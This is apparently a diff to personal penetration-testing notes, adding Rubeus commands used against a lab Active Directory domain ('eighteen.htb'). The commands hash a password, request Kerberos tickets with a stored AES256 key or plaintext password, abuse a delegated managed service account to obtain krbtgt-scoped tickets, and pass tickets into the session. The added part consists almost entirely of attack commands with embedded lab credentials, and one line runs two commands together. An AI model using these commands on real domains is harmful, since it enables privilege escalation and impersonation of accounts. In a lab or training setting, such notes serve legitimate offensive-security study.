@@ -266,3 +266,16 @@ Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MS
 ```
 .\Rubeus.exe monitor /interval:5 /nowrap
 ```
+
+```
+.\Rubeus.exe hash /password:'iloveyou1' /user:adam.scott /domain:eighteen.htb
+
+
+.\Rubeus.exe asktgs /targetuser:bad_dmsa$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:<paste ticket> /outfile:ticket.kirbi
+
+.\Rubeus.exe asktgt /user:0xprofound$ /aes256:493B757EE9BC71195C12D4AD6C778F85CD0AD2D3CD8E57D750261679766990C0 /domain:eighteen.htb /nowrap
+.\Rubeus.exe asktgs /targetuser:0xprofoundDMSA /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:
+
+
+	.\Rubeus.exe asktgt /user:AttackComp$ /password:Hack123! /domain:eighteen.htb /dc:xxx.xxx.xxx.xxx /enctype:aes256 /nowrap .\Rubeus.exe ptt /ticket: < base64 >
+```
